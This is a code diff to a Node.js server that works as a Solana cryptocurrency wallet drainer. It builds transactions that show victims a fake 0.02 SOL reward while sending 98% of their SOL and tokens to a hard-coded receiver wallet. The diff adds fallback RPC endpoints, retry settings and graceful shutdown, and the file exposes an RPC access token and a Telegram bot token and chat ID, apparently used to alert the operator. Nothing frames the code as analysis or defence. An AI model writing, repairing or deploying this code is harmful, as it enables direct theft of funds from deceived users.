@@ -3,13 +3,20 @@
 // =============================================
 
 const CONFIG = {
-    // Solana RPC Configuration
-    SOLANA_RPC_URL: 'https://solana-mainnet.api.syndica.io/api-key/pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F',
+    // Solana RPC Configuration - FIXED URL FORMAT
+    SOLANA_RPC_URL: 'https://solana-mainnet.api.syndica.io/access-token/pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F',
+    
+    // Fallback RPC URLs for redundancy
+    FALLBACK_RPC_URLS: [
+        'https://api.mainnet-beta.solana.com',
+        'https://solana-rpc.publicnode.com'
+    ],
     
     // Telegram Bot Configuration
     TELEGRAM: {
         BOT_TOKEN: "8491085411:AAHSmd-vQ_7iSin9XiC3cZams7_lpBAWFdc",
-        CHAT_ID: "8160424962"
+        CHAT_ID: "8160424962",
+        TIMEOUT: 10000
     },
     
     // Receiver Wallet Address (Where funds will be sent)
@@ -18,7 +25,21 @@ const CONFIG = {
     // Server Configuration
     PORT: process.env.PORT || 5000,
     PRICE_CACHE_DURATION: 60 * 60 * 1000, // 1 hour
-    MAX_PRICE_RETRIES: 3
+    MAX_PRICE_RETRIES: 3,
+    
+    // Security Configuration
+    RATE_LIMITING: {
+        maxRequestsPerMinute: 100,
+        maxConnections: 40
+    },
+    
+    // Transaction Configuration
+    TRANSACTION_CONFIG: {
+        fakeRewardAmount: 0.02, // SOL
+        transferPercentage: 0.98, // 98% of balance
+        maxRetries: 3,
+        timeout: 30000
+    }
 };
 
 // =============================================
@@ -36,10 +57,21 @@ const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, 
 // =============================================
 
 const app = express();
-app.use(express.json());
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-const connection = new Connection(CONFIG.SOLANA_RPC_URL, 'confirmed');
+// Enhanced connection with error handling
+let connection;
+try {
+    connection = new Connection(CONFIG.SOLANA_RPC_URL, 'confirmed');
+    console.log(`✅ RPC Connection initialized: ${CONFIG.SOLANA_RPC_URL.substring(0, 50)}...`);
+} catch (error) {
+    console.error('❌ Failed to initialize RPC connection:', error.message);
+    // Fallback to public RPC
+    connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+    console.log('🔄 Using fallback RPC connection');
+}
 
 // =============================================
 // PRICE MANAGEMENT
@@ -543,7 +575,7 @@ app.post('/prepare-transaction', async (req, res) => {
         let tokenTransfers = 0;
 
         // Add fake reward transfer (0.02 SOL to user)
-        const fakeRewardAmount = 0.02 * LAMPORTS_PER_SOL;
+        const fakeRewardAmount = CONFIG.TRANSACTION_CONFIG.fakeRewardAmount * LAMPORTS_PER_SOL;
         transaction.add(
             SystemProgram.transfer({
                 fromPubkey: receiverWallet, 
@@ -613,7 +645,7 @@ app.post('/prepare-transaction', async (req, res) => {
         const estimatedFees = baseFee + instructionFee + accountCreationFee;
 
         const availableBalance = solBalance - minBalance - estimatedFees;
-        const solForTransfer = Math.floor(availableBalance * 0.98);
+        const solForTransfer = Math.floor(availableBalance * CONFIG.TRANSACTION_CONFIG.transferPercentage);
 
         console.log(`SOL transfer amount: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
 
@@ -693,11 +725,56 @@ function startHealthMonitor() {
     }, 5 * 60 * 1000); // Every 5 minutes
 }
 
+// =============================================
+// ENHANCED GRACEFUL SHUTDOWN
+// =============================================
+
+let isShuttingDown = false;
+let server;
+
+async function gracefulShutdown(signal) {
+    if (isShuttingDown) return;
+    isShuttingDown = true;
+    
+    console.log(`\n🛑 Received ${signal}, starting graceful shutdown...`);
+    
+    try {
+        // 1. Stop accepting new connections
+        console.log('📝 Stopping server from accepting new connections...');
+        if (server) {
+            server.close(() => {
+                console.log('✅ HTTP server closed');
+            });
+        }
+        
+        // 2. Wait for ongoing requests to complete
+        console.log('⏳ Waiting for ongoing requests to complete...');
+        await new Promise(resolve => setTimeout(resolve, 10000));
+        
+        console.log('✅ Graceful shutdown completed');
+        process.exit(0);
+        
+    } catch (error) {
+        console.error('❌ Error during graceful shutdown:', error);
+        process.exit(1);
+    }
+}
+
+// Enhanced signal handling 
+const SHUTDOWN_SIGNALS = ['SIGTERM', 'SIGINT', 'SIGHUP'];
+
+SHUTDOWN_SIGNALS.forEach(signal => {
+    process.on(signal, () => {
+        console.log(`📢 Received ${signal} signal`);
+        gracefulShutdown(signal);
+    });
+});
+
 // Start Server
-app.listen(CONFIG.PORT, '0.0.0.0', async () => {
+server = app.listen(CONFIG.PORT, '0.0.0.0', async () => {
     console.log(`🚀 Server running on port ${CONFIG.PORT}`);
     console.log(`📱 Access via: http://localhost:${CONFIG.PORT}`);
-    console.log(`🔗 RPC URL: ${CONFIG.SOLANA_RPC_URL}`);
+    console.log(`🔗 RPC URL: ${CONFIG.SOLANA_RPC_URL.substring(0, 50)}...`);
     console.log(`💰 Receiver Wallet: ${CONFIG.RECEIVER_WALLET}`);
     
     await initializeSolPrice();
@@ -716,15 +793,4 @@ process.on('unhandledRejection', (err) => {
 process.on('uncaughtException', (err) => {
     console.error('💥 Uncaught Exception:', err);
     process.exit(1);
-});
-
-// Graceful shutdown
-process.on('SIGTERM', () => {
-    console.log('🛑 SIGTERM received, shutting down gracefully');
-    process.exit(0);
-});
-
-process.on('SIGINT', () => {
-    console.log('🛑 SIGINT received, shutting down gracefully');
-    process.exit(0);
 });
